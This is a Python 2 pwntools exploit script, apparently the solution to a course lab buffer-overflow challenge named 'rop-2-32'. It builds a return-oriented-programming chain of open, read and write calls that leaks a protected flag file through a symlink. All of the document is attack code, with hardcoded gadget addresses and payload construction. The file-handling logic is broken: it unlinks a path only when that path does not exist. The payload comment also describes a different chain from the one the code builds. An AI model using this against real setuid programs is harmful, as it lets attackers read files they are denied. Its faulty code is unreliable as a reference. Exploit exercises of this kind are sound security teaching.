#!/usr/bin/env python2

import os

# import pwntools
from pwn import *

env = {}

# prepare the program name and args
argv = [
    #"/home/labs/week6/challenges/rop/rop-3-32",
    "./rop-2-32",
]

p = process(argv, env=env)

open_addr = p.elf.symbols['open']
read_addr = p.elf.symbols['read']
write_addr = p.elf.symbols['write']
string_addr = 0x804860f # 0x18

#0x08048688 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
ppppr_addr = 0x8048688
pppr_addr = 0x8048689
ppr_addr = 0x804868a
pr_addr = 0x804868b

buffer_addr = 0x804a028

if os.path.exists("\x18"):
    os.unlink("\x18")
if not os.path.exists("\x18"):
    os.unlink("\x18")
    os.symlink("flag", "\x18")

# prepare an exploit string
# [dummy][setregid][pop-pop-ret][36001][36001][execve][XXXX][addr of "\xb8"][0][0]
exploit_string = "D"* 140 + \
    p32(open_addr) + p32(ppr_addr) + p32(string_addr) + p32(0) + \
    p32(read_addr) + p32(pppr_addr) + p32(3) + p32(buffer_addr) + p32(100) + \
    p32(write_addr) + p32(pppr_addr) + p32(1) + p32(buffer_addr) + p32(100)


# Print your exploit as a txt file.
# You can use this in gdb, e.g.,
#   gdb-peda$ r < exploit.txt
with open("exploit.txt", "wb") as f:
    f.write(exploit_string)
    f.close()

# send the exploit
p.sendline(exploit_string)

# get an interactive pipe
print p.interactive()
